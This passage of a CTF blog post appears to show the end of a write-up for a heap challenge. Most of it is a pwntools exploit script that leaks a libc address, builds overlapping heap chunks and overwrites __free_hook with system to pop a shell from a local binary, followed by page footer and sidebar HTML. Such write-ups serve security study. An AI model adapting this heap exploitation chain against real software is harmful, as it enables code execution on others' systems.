pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p, <span class="string">&#x27;b free&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size</span>):</span> </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;length&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span> </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;:&#x27;</span>, content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span> </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)    </span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>): </span><br><span class="line">    create(<span class="number">0x20</span>)</span><br><span class="line">create(<span class="number">0x20</span>) <span class="comment">#7 </span></span><br><span class="line">create(<span class="number">0x4f0</span>) <span class="comment">#8 can control everything </span></span><br><span class="line">create(<span class="number">0x4f0</span>) <span class="comment">#9</span></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">create(<span class="number">0x500</span>) <span class="comment">#8</span></span><br><span class="line">create(<span class="number">0x28</span>) <span class="comment">#10 magic chunk</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">show(<span class="number">10</span>)</span><br><span class="line">libcbase = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x1ec010</span></span><br><span class="line">log.success(<span class="string">&#x27;libcbase: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(libcbase)))</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">create(<span class="number">0x20</span>) <span class="comment">#11</span></span><br><span class="line">create(<span class="number">0x20</span>) <span class="comment">#12</span></span><br><span class="line">create(<span class="number">0x20</span>) <span class="comment">#13</span></span><br><span class="line">create(<span class="number">0x438</span>) <span class="comment">#14</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">11</span>) <span class="comment">#10 -11</span></span><br><span class="line">delete(<span class="number">13</span>) <span class="comment">#12 -13</span></span><br><span class="line">create(<span class="number">0x500</span>) <span class="comment">#0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>): </span><br><span class="line">    create(<span class="number">0x20</span>) <span class="comment"># 1-6 11</span></span><br><span class="line">create(<span class="number">0x20</span>) <span class="comment">#15 0x55555555b440 </span></span><br><span class="line">create(<span class="number">0x20</span>) <span class="comment">#13 0x55555555b4a0</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">edit(<span class="number">13</span>, <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x8</span> + <span class="string">&#x27;\x20&#x27;</span>)</span><br><span class="line">edit(<span class="number">10</span>, <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x8</span> + p64(<span class="number">0x4f1</span>) + <span class="string">&#x27;\xa0&#x27;</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">15</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>): </span><br><span class="line">    create(<span class="number">0x20</span>) <span class="comment"># 1,2,3,4,5,6,10</span></span><br><span class="line">create(<span class="number">0x20</span>) <span class="comment">#fakechunk 11</span></span><br><span class="line">edit(<span class="number">11</span>, <span class="string">&#x27;\x20&#x27;</span>)</span><br><span class="line">debug()</span><br><span class="line">edit(<span class="number">14</span>, <span class="string">&#x27;\x01&#x27;</span>*<span class="number">0x438</span>)</span><br><span class="line">edit(<span class="number">14</span>, <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x430</span> + p64(<span class="number">0x4f0</span>))</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">freehook = libcbase + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libcbase + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">create(<span class="number">0x100</span>) <span class="comment">#9</span></span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line">edit(<span class="number">9</span>, <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x80</span> + p64(freehook))</span><br><span class="line">create(<span class="number">0x20</span>) <span class="comment">#13</span></span><br><span class="line">edit(<span class="number">13</span>, <span class="string">&#x27;/bin/sh&#x27;</span> + <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">create(<span class="number">0x20</span>) <span class="comment">#15</span></span><br><span class="line">edit(<span class="number">15</span>, p64(system))</span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/10/19/2021%E9%B9%A4%E5%A3%81%E6%9D%AF/" rel="next" title="2021鹤壁杯">
+                <i class="fa fa-chevron-left"></i> 2021鹤壁杯
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="http://qvb75z5z6.hn-bkt.clouddn.com/1605841888100229.jpeg"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/xxy1126" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:1335926819@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#2-23"><span class="nav-number">1.</span> <span class="nav-text">2.23</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-29-2-31"><span class="nav-number">2.</span> <span class="nav-text">2.29-2.31</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BE%8B%E9%A2%982021%E5%B9%BF%E4%B8%9C%E5%BC%BA%E7%BD%91%E6%9D%AFT-S"><span class="nav-number">3.</span> <span class="nav-text">例题2021广东强网杯T_S</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A"><span class="nav-number">3.1.</span> <span class="nav-text">方法一：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">3.1.1.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A"><span class="nav-number">3.2.</span> <span class="nav-text">方法二：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-1"><span class="nav-number">3.2.1.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Tm0tfl</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+</body>
+</html>
